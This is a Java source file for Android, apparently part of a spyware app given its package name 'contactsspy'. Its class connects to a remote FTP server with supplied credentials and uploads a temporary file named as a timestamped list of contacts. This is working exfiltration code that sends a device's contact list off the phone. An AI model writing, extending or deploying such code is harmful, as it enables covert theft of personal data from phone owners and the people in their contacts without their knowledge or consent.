package com.example.contactsspy;

import android.content.Context;
import android.net.Uri;
import android.os.AsyncTask;
import android.util.Log;

import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;

public class FTPModel {
    public FTPClient mFTPClient = null;

    public boolean connect(String host, String username, String password, int port, Context context)
    {
        try
        {
            return new asyncConnexion(host, username, password, port, context).execute().get();
        }
        catch (Exception e)
        {
            return false;
        }
    }

    public boolean connect(String host, String username, String password, int port, Context context, File tempFileforSending)
    {
        try
        {
            return new asyncConnexion(host, username, password, port, context, tempFileforSending).execute().get();
        }
        catch (Exception e)
        {
            return false;
        }
    }

    public class asyncConnexion extends AsyncTask<Void, Void, Boolean>
    {
        private String host;
        private String username;
        private String password;
        private int port;
        private Context context;
        private File tempFileforSending;

        asyncConnexion(String host, String username, String password, int port, Context context)
        {
            this.host = host;
            this.password = password;
            this.port = port;
            this.username = username;
            this.context = context;
        }

        asyncConnexion(String host, String username, String password, int port, Context context, File tempFileforSending)
        {
            this.host = host;
            this.password = password;
            this.port = port;
            this.username = username;
            this.context = context;
            this.tempFileforSending = tempFileforSending;
        }


        @Override
        protected Boolean doInBackground(Void... voids) {
            try {

                mFTPClient = new FTPClient();
                // connecting to the host
                mFTPClient.connect(host, port);

                // now check the reply code, if positive mean connection success
                boolean status = mFTPClient.login(username, password);

                mFTPClient.setFileType(FTP.BINARY_FILE_TYPE);
                mFTPClient.enterLocalPassiveMode();
                /*File tempFile;
                tempFile = File.createTempFile("tempfile", ".txt", context.getCacheDir());
                //OutputStream out = getContentResolver().openOutputStream(Uri.fromFile(tempFile));
                OutputStream out = context.getContentResolver().openOutputStream(Uri.fromFile(tempFile));
                out.write("A long time ago...".getBytes());
                out.close();//*/

                FileInputStream ifile = new FileInputStream(tempFileforSending);

                SimpleDateFormat SDFormat = new SimpleDateFormat("yyyy_MM_dd'T'HH-mm-ss");
                Date date = Calendar.getInstance().getTime();
                String currentTime = SDFormat.format(date);
                String sendingFileName = "List_of_contacts" + currentTime + ".txt";

                mFTPClient.storeFile(sendingFileName, ifile);
                mFTPClient.logout();
                ifile.close();
                return status;

            } catch (Exception e) {
                Log.i("testConnection", "Error: could not connect to host " + host);
                e.printStackTrace();

            }
            return false;
        }
    }
}


